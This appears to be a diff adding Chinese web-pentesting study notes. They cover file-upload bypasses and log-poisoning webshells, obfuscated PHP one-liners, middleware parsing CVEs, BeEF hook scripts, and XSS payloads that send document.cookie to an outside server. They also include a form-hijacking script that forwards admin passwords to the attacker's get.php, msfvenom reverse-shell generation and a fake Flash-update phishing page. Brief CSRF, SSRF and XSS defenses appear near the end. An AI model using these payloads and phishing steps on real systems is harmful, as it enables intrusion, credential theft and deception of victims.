+<p>无 index.php 文件：没有首页文件并且过滤非常严谨，可以先上传任意内容的 index.php 文件，再上传内容为 auto_prepend_file=/var/log/nginx/access.log 的.user.ini 文 件，抓包并在 UA 中写入一句话后门则可以得到 webshell</p>
+</li>
+</ul>
+<p><strong>*.user.ini 实际上就是一个可以由用户 “自定义” 的 php.ini，我们触发访问的的代码并不是.user.ini 也不是 1.png 而是 index.php，它有去让这个.user.ini 生效。我们访问 index.php, 会按照我们上传的.user.ini 去解析，解析了我们上传的包含恶意代码的 test.png 文件。</strong></p>
+<h4 id="ip转为纯数字访问"><a class="markdownIt-Anchor" href="#ip转为纯数字访问">#</a> ip 转为纯数字访问</h4>
+<p>在线转换地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9jb252ZXJ0L2lwMmludC8=">https://www.bejson.com/convert/ip2int/</span><br>
+ 如要访问 <span class="exturl" data-url="aHR0cDovLzEuMTE3LjUyLjIxOQ==">http://1.117.52.219</span> 可以访问 <span class="exturl" data-url="aHR0cDovLzI0NDU4NDU5">http://24458459</span><br>
+ 其中 1x256<sup>3+117x256</sup>2+52x256+219=24458459<br>
+ 可以当对方对 ip 做了点过滤的时候进行绕过</p>
+<h4 id="一句话木马被过滤的情况"><a class="markdownIt-Anchor" href="#一句话木马被过滤的情况">#</a> 一句话木马被过滤的情况</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">变形一句话木马</span></span><br><span class="line">&lt;?php eval($_POST[x]);?&gt;</span><br><span class="line">&lt;?=eval($_POST[x]);?&gt;</span><br><span class="line">&lt;?=eval($_POST&#123;x&#125;);?&gt;</span><br><span class="line">&lt;?=system(&#x27;tac ../fl*&#x27;)?&gt;</span><br><span class="line">&lt;?=`tac ../fl*`?&gt;</span><br><span class="line">&lt;? echo `tac /var/www/html/f*`?&gt;</span><br><span class="line">&lt;?php $a=&#x27;syste&#x27;;$b=&#x27;m&#x27;;$c=$a.$b;$c(&#x27;ls ../&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="日志文件写木马"><a class="markdownIt-Anchor" href="#日志文件写木马">#</a> 日志文件写木马</h4>
+<p><strong>nginx 的日志文件时 /var/log/nginx/access.log，可以通过修改.user.ini 的配置使 index.php 包含其 nginx 日志文件，此时访问 index.php 文件时将会定位到日志文件。日志文件中记录有 UA 头，伪造 UA 数据为一句话木马，此木马被记录到 日志，在 index.php 处执行木马文件即可获得 webshell。</strong></p>
+<ul>
+<li>
+<p>上传.user.ini: auto_prepend_file=test.png</p>
+</li>
+<li>
+<p>上传 test.png: <?=include"/var/lo"."g/nginx/access.lo"."g"?> 访问 index.php 文件则会出现 nginx 的日志文件</p>
+</li>
+<li>
+<p>抓包伪造 UA: <?=eval($_POST[x]);?></p>
+</li>
+<li>
+<p>执行木马: x=system (‘tac …/flag.php’);</p>
+</li>
+</ul>
+<h4 id="中间件导致的解析漏洞"><a class="markdownIt-Anchor" href="#中间件导致的解析漏洞">#</a> 中间件导致的解析漏洞</h4>
+<ul>
+<li>
+<p>IIS 6 7 : 文件名 x.asp;.x.jpg、目录名 x.asp/x.jpg</p>
+</li>
+<li>
+<p>Apache 换行解析 配置不当: CVE-2017-15715，2.4.0~2.4.29 版本存在解 析漏洞；上传 evil.php 文件，在文件末尾添加空格，找到 hex 中的 20 修改为 0a，上传之后访问文件 /evil.php%0a 即可触发后门代码内容</p>
+</li>
+<li>
+<p>Apache htaccess 配置不当：AddHandler application/x-httpd-php .php，将 1.php.png 解析为 php</p>
+</li>
+<li>
+<p>nginx 文件名逻辑：CVE-2013-4547 ,0.8.4 ~1.4.3 / 1.5.0~1.5.7 存在文件名逻辑 漏洞；上传内容为 <?php phpinfo();?> 的 “1.gif [0x20]” 文件，访问 /1.gif [0x20][0x00].php，即可发现 PHP 被解析<br>
+ <code>* [0x20]表示 hex 处的值是 20，对应可视化界面是一个空格</code></p>
+</li>
+<li>
+<p>nginx nginx.conf 配置不当：该漏洞与 Nginx、php 版本无关，属于用户配置 不当造成的解析漏洞，上传 /nginx.png，访问 /nginx.png/.php 即可解析 png 为 php  <code>* 实战可以直接找到属于该中间件下的一个图片的原链接地址，后缀加/.php 测试是否执行</code></p>
+</li>
+<li>
+<p>编辑器漏洞：如果能扫描到编译器目录，可以寻找是否存在相关历史漏洞</p>
+</li>
+</ul>
+<h4 id="漏洞寻找及审计技巧"><a class="markdownIt-Anchor" href="#漏洞寻找及审计技巧">#</a> 漏洞寻找及审计技巧</h4>
+<ul>
+<li>黑盒：</li>
+</ul>
+<p>黑盒寻找一切存在文件上传的功能应用 (看流程): 个人用户中心是否存在文件上传功能、后台管理系统是否存在文件上传功能、字典目录扫描探针文件上传构造地址、字典目录扫描探针编辑器目录构造地址。</p>
+<p>黑盒测试功能:<br>
+ 上传文件进行数据包拦截，尝试修改后缀、MIME 类型、后缀大小写、加点空格、 文件头部、.user.ini、.htaccess 等，如都失败了，可以抓取其他功能如重命名数据包看是 否能修改后缀、可以改 404 模板看是否允许修改、还可以先下载模板并写入木马后用后 台删除原有模板并重新加载带有木马的模板等。</p>
+<p>如果已经上传了 php 文件但是并没有被执行而是返回了 403，很有可能是目录做了 限制如.htaccess 的过滤，可以上传或重命名或移动到其他目录下尝试是否能被执行，还 可以直接删除.htaccess 文件消除此目录下的限制。</p>
+<ul>
+<li>白盒：</li>
+</ul>
+<p>白盒看三点，中间件，编辑器，功能代码 (看代码): 中间件直接看语言环境常见搭 配编辑器、直接看目录机构或搜索关键字、功能代码直接看源码应用或搜索关键字。</p>
+<p>白盒调试代码:<br>
+ 一般调试代码是通过代码编辑器里边的调试按键或者直接打印某些不容易推断的变 量，也可以通过网站的审查元素功能确定当前的 url 及传参地址，还能通过 burp 抓取数 据包，直接就可以确定当前操作的 url 地址并且在代码中进行定位。</p>
+<p>根据 url 地址或者上传恶意文件时文件的报错锁定代码位置，追朔代码过滤规则及漏 洞产生的原因，在哪个地方过滤的，是黑白名单过滤还是过滤不严谨等。</p>
+<h3 id="xss-跨站"><a class="markdownIt-Anchor" href="#xss-跨站">#</a> xss 跨站</h3>
+<h4 id="xss-原理分类及寻找"><a class="markdownIt-Anchor" href="#xss-原理分类及寻找">#</a> xss 原理分类及寻找</h4>
+<ul>
+<li>xss 跨站原理</li>
+</ul>
+<p>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其 他用户造成影响的 HTML 代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执 行用户注入的脚本。</p>
+<ul>
+<li>xss 跨站分类</li>
+</ul>
+<p>反射型（非持久型）: 指执行一次的漏洞，不会存储到数据库中<br>
+存储型（持久型）: 攻击代码写入到了数据库里，其他人访问时被攻击<br>
+ DOM 型：数据的输入输出都是在浏览器 js 代码里边完成的，没有进入后端</p>
+<ul>
+<li>xss 漏洞的寻找</li>
+</ul>
+<p>数据交互的地方:get/post/headers，反馈与浏览，富文本编辑器，各类标签插入和自定义<br>
+数据输出的地方：用户资料，关键词、标签、说明，文件上传</p>
+<h4 id="beef-xss-安装及使用"><a class="markdownIt-Anchor" href="#beef-xss-安装及使用">#</a> beef-xss 安装及使用</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用docker在服务器安装，默认用户名密码都是beef</span></span><br><span class="line">docker pull janes/beef</span><br><span class="line">3docker run - p 3000:3000 - d janes/beef</span><br><span class="line">http://110.42.178.227:3000/ui/panel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">本地写内容如下的 1 .html文件，当此页面被打开时，即beef上线</span></span><br><span class="line">&lt;script src=&quot;http://110.42.178.227:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">beef观察到用户上线，可以在beef上盗取cookies，浏览器跳转，钓鱼等操作</span></span><br></pre></td></tr></table></figure>
+<p><strong>将 hook 的指向代码放到自己的网站首页的内容里，同时引诱对方去访问自己的网站，当对方访问自己网站首页时，此时就会劫持到对方当前页面，可窃取 cookie; 但是毕竟是前 端代码造成的危害，js 代码可执行的操作很有限，需要诱使对方去下载木马拿主机权限</strong></p>
+<h4 id="mac克隆网站至本地"><a class="markdownIt-Anchor" href="#mac克隆网站至本地">#</a> mac 克隆网站至本地</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过SiteSucker克隆网站或者wget的方式下载源码</span></span><br><span class="line">wget -r http://word.wd1x.com/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将源码移动到/Library/WebServer/Documents目录下</span></span><br><span class="line">sudo mv ~/Downloads/word.wd1x.com/ /Library/WebServer/Documents</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置此目录的权限使得任意用户可访问</span></span><br><span class="line">sudo chmod - R 777 /Library/WebServer/Documents/word.wd1x.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改apache配置文件，改变index.html指向</span></span><br><span class="line">sudo cp /etc/apache2/httpd.conf /etc/apache2/httpd.conf.bak</span><br><span class="line">sudo vim /etc/apache2/httpd.conf</span><br><span class="line">DirectoryIndex /word.wd1x.com/index.html index.html</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用apachectl操作apache的启动或停止</span></span><br><span class="line">sudo apachectl start/stop/restart</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问http://localhost或者http://localhost/word.wd1x.com</span></span><br></pre></td></tr></table></figure>
+<h4 id="uxss-flashxss-pdfxss"><a class="markdownIt-Anchor" href="#uxss-flashxss-pdfxss">#</a> uxss、flashxss、pdfxss</h4>
+<ul>
+<li>
+<p>UXSS (通用型 xss): 利用浏览器或者浏览器扩展漏洞来制造产生 XSS 并执 行代码的一种攻击类型，CVE-2021-34506 Edge 低版本浏览器翻译功能导致 JS 语句被调用执行。</p>
+</li>
+<li>
+<p>Flashxss:swf 引用 js 的 xss，swf 下载后利用 JPEXS Free Flash Decompiler 反编译审计，寻找 ExternalInterface.call 执行 JS 代码的地方。</p>
+</li>
+<li>
+<p>PDFXSS: 上传后直链触发，创建 PDF 加入动作 JS、通过文件上传获取直链、直链地址通过浏览器访问后被触发，常用于钓鱼诱使对方下载 pdf 文件并 用 js 代码窃取相关凭据。</p>
+</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># pdfxss的制作及应用场景</span><br><span class="line">下载迅捷pdf编辑器-文件-新建文档-从空白页</span><br><span class="line">视图-页面缩略图-右键缩略图属性-添加动作-新增运行js代码-app.alert(1)</span><br><span class="line">然后保存为1.pdf，后将pdf文件用浏览器打开即可触发js代码</span><br><span class="line">pdfxss上线beef的代码&lt;script src=&quot;http://110.42.178.227:3000/hook.js&quot;&gt;&lt;/script&gt;不对，可能是需要其他的代码或者其他的手段才能窃取cookie</span><br></pre></td></tr></table></figure>
+<h4 id="表单劫持实现权限维持"><a class="markdownIt-Anchor" href="#表单劫持实现权限维持">#</a> 表单劫持实现权限维持</h4>
+<p>前提是已经拿到了后台权限或者当前可以修改一些敏感文件；如 /login.php 登录后跳转到了 /admin/index.php 页面，可以修改后者，增加代码为上线 beef 或者 xss 平台窃取 cookie 的内容，则对方管理员在登录后就会将 cookie 发送到我们所设置的平台上。而若对方网站有同源策略或者防护的情况下，我们得到的 cookie 是不完整的，如丢失了 PHPSESSION，剩下的 cookie 部分不支持我们登入其后台。</p>
+<p>此时可以通过表单劫持来实现权限维持，通过抓包分析出网站在输入密码后会访问的网址如 /admin/login_check.php 页面，找到记录账户和密码的变量，将其发送到自己的远程服务器，$i=<script src="http://x.x.x.x/get.php?user=account&pass=passwd"></script>;echo $i，在自己的服务器上构造 get.php 文件用来接收 js 传过来的参数。于是乎，当对方每次登录后台的时候都会把最新的密码发送到自己的服务器上。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务器上的get.php的内容如下：</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">u=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">p=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">myfile = fopen(<span class="string">&quot;newfile.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span></span><br><span class="line"><span class="meta prompt_">fwrite($</span><span class="language-bash">myfile, <span class="variable">$u</span>);</span></span><br><span class="line"><span class="meta prompt_">fwrite($</span><span class="language-bash">myfile, <span class="string">&#x27;|&#x27;</span>);</span></span><br><span class="line"><span class="meta prompt_">fwrite($</span><span class="language-bash">myfile, <span class="variable">$p</span>);</span></span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">myfile);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>浏览器网马配合 MSF 访问上线 (windows XP/windows 7):</li>
+</ul>
+<p>先配置 msfconsole 生成 URLuse exploit/windows/browser/ms14_064_ole_code_execution;set allowpowershellprompt true;set target 1;run; 会生成一个 url 地址，诱使受害者访问此 URL，一旦访问之后，msf 就会上线拿到对方主机权限。</p>
+<p>也可以先将 beef 代码放在自己的服务器上诱使对方访问恶意 url 地址，再通过 beef 的功能执行由 msf 生成的 url 进行上线。由于只适用于 XP/7 系统，在现在的网络环境上已经几乎碰不到了，但是钓鱼的思路还是很不错的。</p>
+<h4 id="flash钓鱼配合msf捆绑"><a class="markdownIt-Anchor" href="#flash钓鱼配合msf捆绑">#</a> Flash 钓鱼配合 MSF 捆绑</h4>
+<p>参考地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGhlc3BhY2UvcC8xNTUyMDk0NS5odG1s">https://www.cnblogs.com/thespace/p/15520945.html</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">msf 生成后门:</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.16 8.0.102 LPORT=4444 -f exe -o ~/Desktop/flash.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载官方文件旧版 www.flash.cn 的钓鱼页,并下载 flash 的最新安装程序。</span></span><br><span class="line">https://github.com/r00tSe7en/Fake-flash.cn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载 winrar 解压缩工具，将 flash.exe 与 flash_install.exe 文件捆绑，选中之后-用 winrar 压缩-勾选自解压格式压缩文件-高级中的自解压选项-解压路径为 C:\windows\temp, 选择设置中解压前运行 flash.exe，解压后运行 flash_install.exe-重命名后保存。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">图标伪造，利用 Restorator 工具，将 flash 原有的图标导出为 ico，并且将用 rar 新生 成的 exe 的图标改为 flash 图标并保存后获得正确的图标。将此文件放入到外网地址中， 并用钓鱼页面的下载地址指向 flash_install.exe 的下载链接。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">MSF配置监听状态</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次使用适当的语言诱使受害者点击，需要准备精心设计的 html 页面，并在点击图 片或者视频的时候会跳转到远程的 flash 下载界面，当用户点击下载 flash 并且执行后， 木马就会成功上线，msf 就会接收到对方主机的会话。钓鱼代码如下所示</span></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;小迪与某主播SESE画面流出！&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  小迪与某主播SESE画面流出！&lt;br&gt;</span><br><span class="line">  &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot; width=&quot;300&quot; height=600 align=&quot;absmiddle&quot;/ onclick=a()&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function a()&#123;</span><br><span class="line">  alert( &quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;);</span><br><span class="line">  window.location.href=&quot;http://192.168.0.111/&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>++ 实测中木马未做免杀被 Defender 拦截，且 rar 压缩出现了问题，并没有释放 exe 木马</p>
+<h4 id="mac与win上互联操作"><a class="markdownIt-Anchor" href="#mac与win上互联操作">#</a> mac 与 win 上互联操作</h4>
+<p><strong>mac 查看 win 上某个文件内容并复制</strong></p>
+<ul>
+<li>
+<p>通过终端或者 ssh 连接工具：<br>
+ssh <span class="exturl" data-url="bWFpbHRvOmFkbWluaXN0cmF0b3JAMTkyLjE2OC4wLjExMQ==">administrator@192.168.0.111</span><br>
+cd /d “G:\xiaodi\37 - 权限维持 &amp; 钓鱼 &amp; MSF 等”<br>
+type 表单劫持.txt</p>
+</li>
+<li>
+<p>通过 vnc 或者 rdp：直接通过可视化界面复制相关内容</p>
+</li>
+<li>
+<p>通过 nc 工具来实时终端聊天 (需要打开防火墙对应端口)：</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控端：</span></span><br><span class="line">nc - l -v - v - p 4444 或 nc - lvvp 4444 (命令与nc版本有关)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端：</span></span><br><span class="line">nc 192.168.0.111 4444</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>传输文件时用 scp 或 ssh 连接工具<br>
+ scp <span class="exturl" data-url="bWFpbHRvOmNoZW50dW9AMTkyLjE2OC4wLjEwMg==">chentuo@192.168.0.102</span>:~/Desktop/flash.exe.</p>
+</li>
+<li>
+<p>其他：通过设置 smb 或 nfs 来实现共享存储</p>
+</li>
+</ul>
+<p><strong>mac 和 win 实时通讯</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在windows上通过mobex连接到mac，并开启本地监听：</span></span><br><span class="line">nc -l 4444 -v</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在mac上开始将内容发送至 4444:</span> </span><br><span class="line">nc 127.0.0.1 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">此后就可以在两个电脑之间互相发送临时内容了</span></span><br></pre></td></tr></table></figure>
+<p><strong>mac 和 win 共享文件夹</strong></p>
+<p>mac 上开启 smb 文件共享，单独设置一个用户 smbtest 和密码，为其开放指定目录，并在 wifi 的高级设置中 WINS 中添加 windows 的 ip 地址</p>
+<p>win 上通过运行输入 \192.168.x.x 加入到 mac 的共享文件夹当中即可</p>
+<p>win 上通过 shift+windows+s 键可以截图，并最终保存到共享文件夹当中即可</p>
+<h4 id="xss常见绕过方法"><a class="markdownIt-Anchor" href="#xss常见绕过方法">#</a> xss 常见绕过方法：</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">window.location.href=<span class="string">&#x27;https://www.baidu.com&#x27;</span> 指将当前页面跳转到百度</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">document.cookie指获取当前页面的cookie的值</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可在审查元素中的console即控制台中输入js代码测试其功能</span></span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">script被过滤之后可用其他的标签来进行替换</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">onload事件是浏览器解析完页面之后就会自动触发的事件</span></span><br><span class="line">&lt;img src=1 onerror=window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class="line">&lt;body onload=1 onerror=window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class="line">&lt;input onload=&quot;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class="line">&lt;svg onload=&quot;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">空格被过滤的情况下，可以用<span class="string">&#x27;/&#x27;</span>进行替换</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台管理员有功能页面，能够查看注册用户的账号密码 将注册的帐号密码改成JS代码（获取cookie）， 在管理员查看账号密码的时候触发 JS</span></span><br><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台管理员的cookie的值如果有实效，得到之后很快就不可再次使用，那么可以直接读取后台界面的内容，这里根据html标签匹配到了固定位置的代码，也可以用js代码来获取页面全部的源代码</span></span><br><span class="line">&lt;script&gt; $(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">if(value.innerHTML.indexOf(&#x27;ctf&#x27;+&#x27;show&#x27;)&gt;-1)&#123; window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+value.innerHTML;</span><br><span class="line">&#125; &#125;);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改密码的时候抓到了一个url地址，通过此url地址改变了当前用户的密码，可以让管理员以其身份去执行恶意构造的url被动的修改其密码，这也是csrf漏洞；通过js代码新建了一个带有修改管员密码的用户，管员在查看此用户信息的时候就会执行js代码从而密码被改</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">location会重定向动静太大，而src是没有感知的；js需要通过ajax来post数据</span></span><br><span class="line">&lt;script&gt;src=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="xss修复及防止措施"><a class="markdownIt-Anchor" href="#xss修复及防止措施">#</a> XSS 修复及防止措施</h4>
+<ul>
+<li>
+<p>过滤一些危险字符，以及转义 &amp; &lt; &gt; &quot; ’ 等危险字符</p>
+</li>
+<li>
+<p>HTTP-only Cookie：用来保护 cookie，防止 cookie 被窃取</p>
+</li>
+</ul>
+<p>php.ini 设置：session.cookie_httponly =1</p>
+<p>或代码引用：ini_set (“session.cookie_httponly”, 1);</p>
+<ul>
+<li>设置 CSP (Content Security Policy)：用来防止内容被外部调用，同时也能防止 xss</li>
+</ul>
+<p>代码引用：header (&quot;Content-Security-Policy:img-src ‘self’&quot;);</p>
+<ul>
+<li>输入内容长度限制，实体转义等</li>
+</ul>
+<h3 id="csrf-ssrf"><a class="markdownIt-Anchor" href="#csrf-ssrf">#</a> csrf、ssrf</h3>
+<h4 id="241-csrf原理-利用及防御"><a class="markdownIt-Anchor" href="#241-csrf原理-利用及防御">#</a> 2.4.1 csrf 原理、利用及防御</h4>
+<p>（1）CSRF 原理及定义</p>
+<p>a 某登陆自己的后台，b 某引诱 a 某点击自己伪造的网址；b 某在自己的页<br>
+面上写上 a 某添加自己后台管理员的数据包；a 某触发该恶意数据包，管理员被<br>
+添加；即重复发送数据包让受害者利用他的权限请求我们定义的数据包。<br>
+添加管理员的数据包可以本地搭建相同的 cms 或者框架，并且利用 csrftest<br>
+ 工具截取到执行操作的数据包并构造 url。</p>
+<ul>
+<li>csrftest 工具比较古老了已经，也可以自己抓取捕获敏感流程数据包测试</li>
+</ul>
+<p>（2）CSRF 的攻击过程两个条件：</p>
+<p>目标用户已经登录了网站，能够执行网站的功能<br>
+目标用户访问了攻击者构造的 URL</p>
+<ul>
+<li>如我正在网站后台执行一些操作，突然一个人发来一个很有诱惑性的地址，我点进去一<br>
+看什么也不执行，但是此页面却在无形之中给我的网站增加了一个用户或者修改了管理员<br>
+密码，可以通过查看 log 中的 POST 数据及增 / 改管理员数据包的线索朔源。</li>
+</ul>
+<p>（3）CSRF 防御策略：</p>
+<p>同源策略，检测来源是否是同一域名，但可以通过抓取数据包修改 Refer 来<br>
+源；一是在代码中伪造数据包固定 Refer 来源（可以写一个 py 脚本自定义数据<br>
+包进行伪造）、二是尝试寻找可上传地方，上传 html 的恶意 url 地址。<br>
+加入 token，每次操作都会有一个随机 token，这个 token 是唯一的无法绕过<br>
+加入验证码，但是可以用 burp 的验证码插件完成</p>
+<h4 id="242-ssrf原理-危害及修复"><a class="markdownIt-Anchor" href="#242-ssrf原理-危害及修复">#</a> 2.4.2 ssrf 原理、危害及修复</h4>
+<p>（1）SSRF 原理及定义</p>
+<p>相当于我们以存在 SSRF 这个服务器为跳板进行的一些加载操作，程序写</p>
+<p>法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一</p>
+<p>些恶意的脚本文件。可以在此功能点探测内网服务，识别内网资产，远程下载</p>
+<p>木马并直接运行。</p>
+<p>（2）SSRF 的危害：</p>
+<p>加载外部的恶意木马文件执行</p>
